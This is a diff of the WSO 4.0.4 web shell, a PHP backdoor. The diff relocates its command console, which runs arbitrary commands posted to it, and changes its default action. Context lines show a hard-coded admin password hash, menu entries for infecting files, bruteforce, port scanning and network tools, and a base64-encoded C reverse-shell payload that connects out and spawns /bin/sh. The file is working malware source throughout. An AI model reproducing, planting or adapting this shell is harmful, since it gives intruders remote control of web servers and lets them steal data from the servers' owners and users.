@@ -1,5 +1,5 @@
 <?php
-/* WSO 4.0.3 (Web Shell by HARD _LINUX) */
+/* WSO 4.0.4 (Web Shell by HARD _LINUX) */
 $auth_pass = "21232f297a57a5a743894a0e4a801fc3"; //admin
 $color = "#fff";
 $default_action = 'FilesMan';
@@ -15,7 +15,7 @@ if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.0.3');
+@define('VERSION', '4.0.4');
 if( get_magic_quotes_gpc() ) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -53,7 +53,8 @@ if( $os == 'win') {
 }
 if( $cwd[strlen($cwd)-1] != '/' )
 	$cwd .= '/';
-	
+
+// Console go --------------------
 if($os == 'win')
 	$aliases = array(
 		"List Directory" => "dir",
@@ -115,6 +116,74 @@ else
 		"locate dump files" => "locate dump",
 		"locate priv files" => "locate priv"	
 	);
+	function actionConsole() {
+	if(isset($_POST['ajax'])) {
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
+		ob_start();
+		echo "document.cf.cmd.value='';\n";
+		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
+		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
+			if(@chdir($match[1])) {
+				$GLOBALS['cwd'] = @getcwd();
+				echo "document.mf.c.value='".$GLOBALS['cwd']."';";
+			}
+		}
+		echo "document.cf.output.value+='".$temp."';";
+		echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
+		$temp = ob_get_clean();
+		echo strlen($temp), "\n", $temp;
+		exit;
+	}
+	printHeader();
+?>
+<script>
+if(window.Event) window.captureEvents(Event.KEYDOWN);
+var cmds = new Array("");
+var cur = 0;
+function kp(e) {
+	var n = (window.Event) ? e.which : e.keyCode;
+	if(n == 38) {
+		cur--;
+		if(cur>=0)
+			document.cf.cmd.value = cmds[cur];
+		else
+			cur++;
+	} else if(n == 40) {
+		cur++;
+		if(cur < cmds.length)
+			document.cf.cmd.value = cmds[cur];
+		else
+			cur--;
+	}
+}
+function add(cmd) {
+	cmds.pop();
+	cmds.push(cmd);
+	cmds.push("");
+	cur = cmds.length-1;
+}
+</script>
+<?php
+	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
+	foreach($GLOBALS['aliases'] as $n => $v) {
+		if($v == '') {
+			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
+			continue;
+		}
+		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
+	}
+	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+	if(!empty($_POST['p1'])) {
+		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
+	}
+	echo '</textarea><table style="border:1px solid #000;background-color:#000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
+	echo '</form></div><script>document.cf.cmd.focus();</script>';
+	printFooter();
+}
+// Console end --------------------
+
 function printHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = "UTF-8";
@@ -238,8 +307,8 @@ function printHeader() {
 	$opt_charsets = '';
 	foreach($charsets as $item)
 		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
+		
 	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Port Scanner'=>'PortScanner','Bruteforce'=>'Bruteforce','Network'=>'Network','Domains'=>'Domains');
-	
 	if(!empty($GLOBALS['auth_pass']))
 	$m['Logout'] = 'Logout';
 	$m['Self remove'] = 'SelfRemove';
@@ -363,6 +432,8 @@ function which($p) {
 		return $path;
 	return false;
 }
+
+// Sec. Info go --------------------
 function actionSecInfo() {
 	printHeader();
 	echo '<h1>Server security information</h1><div class=content>';
@@ -430,6 +501,9 @@ function actionSecInfo() {
 	echo '</div>';
 	printFooter();
 }
+// Sec. Info end --------------------
+
+// PHP -----------------------
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
 		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
@@ -465,6 +539,8 @@ function actionPhp() {
 	echo '</pre></div>';
 	printFooter();
 }
+// PHP end --------------------
+
 function actionFilesMan() {
 	printHeader();
 	echo '<h1>File manager</h1><div class=content>';
@@ -618,6 +694,8 @@ function actionFilesMan() {
 	<?php
 	printFooter();
 }
+
+// String tools go --------------------
 function actionStringTools() {
 	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
     if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
@@ -706,6 +784,8 @@ function actionStringTools() {
 		</form></div>";
 	printFooter();
 }
+// String tools end --------------------
+
 function actionFilesTools() {
 	if( isset($_POST['p1']) )
 		$_POST['p1'] = urldecode($_POST['p1']);
@@ -909,72 +989,6 @@ function actionSafeMode() {
 	echo '</div>';
 	printFooter();
 }
-function actionConsole() {
-	if(isset($_POST['ajax'])) {
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
-		ob_start();
-		echo "document.cf.cmd.value='';\n";
-		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
-		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
-			if(@chdir($match[1])) {
-				$GLOBALS['cwd'] = @getcwd();
-				echo "document.mf.c.value='".$GLOBALS['cwd']."';";
-			}
-		}
-		echo "document.cf.output.value+='".$temp."';";
-		echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
-		$temp = ob_get_clean();
-		echo strlen($temp), "\n", $temp;
-		exit;
-	}
-	printHeader();
-?>
-<script>
-if(window.Event) window.captureEvents(Event.KEYDOWN);
-var cmds = new Array("");
-var cur = 0;
-function kp(e) {
-	var n = (window.Event) ? e.which : e.keyCode;
-	if(n == 38) {
-		cur--;
-		if(cur>=0)
-			document.cf.cmd.value = cmds[cur];
-		else
-			cur++;
-	} else if(n == 40) {
-		cur++;
-		if(cur < cmds.length)
-			document.cf.cmd.value = cmds[cur];
-		else
-			cur--;
-	}
-}
-function add(cmd) {
-	cmds.pop();
-	cmds.push(cmd);
-	cmds.push("");
-	cur = cmds.length-1;
-}
-</script>
-<?php
-	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
-	foreach($GLOBALS['aliases'] as $n => $v) {
-		if($v == '') {
-			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
-			continue;
-		}
-		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
-	}
-	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
-	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
-	if(!empty($_POST['p1'])) {
-		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
-	}
-	echo '</textarea><table style="border:1px solid #000;background-color:#000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
-	echo '</form></div><script>document.cf.cmd.focus();</script>';
-	printFooter();
-}
 function actionLogout() {
 	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 	echo 'bye!';
@@ -1064,6 +1078,8 @@ function actionInfect() {
 		}
 	printFooter();
 }
+
+// Bruteforce go --------------------
 function actionBruteforce() {
 	printHeader();
 	if( isset($_POST['proto']) ) {
@@ -1147,6 +1163,9 @@ function actionBruteforce() {
 	echo '</div><br>';
 	printFooter();
 }
+// Bruteforce end --------------------
+
+// Sql go ----------------------------
 function actionSql() {
 	class DbClass {
 		var $type;
@@ -1339,7 +1358,7 @@ function actionSql() {
 	}else
 		echo $tmp;
 	?></td>
-				<td><input type=submit value=">>"></td>
+			<td><input type=submit value=">>"></td>
 			</tr>
 		</table>
 		<script>
@@ -1429,6 +1448,9 @@ function actionSql() {
 	echo '</div>';
 	printFooter();
 }
+// Sql end -------------------------
+
+// Network go --------------------
 function actionNetwork() {
 	printHeader();
 	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
@@ -1482,6 +1504,9 @@ function actionNetwork() {
 	echo '</div>';
 	printFooter();
 }
+// Network end --------------------
+
+// Port Scanner go --------------------
 function actionPortScanner() {
     printHeader();
     echo '<h1>Port Scanner</h1>';
@@ -1512,11 +1537,13 @@ function actionPortScanner() {
     echo '</div>';
     printFooter();    
 }
+// Port Scanner end --------------------
+
 if( empty($_POST['a']) )
 	if(isset($default_action) && function_exists('action' . $default_action))
 		$_POST['a'] = $default_action;
 	else
-		$_POST['a'] = 'SecInfo';
+		$_POST['a'] = 'FilesMan';
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
 	call_user_func('action' . $_POST['a']);
 ?>
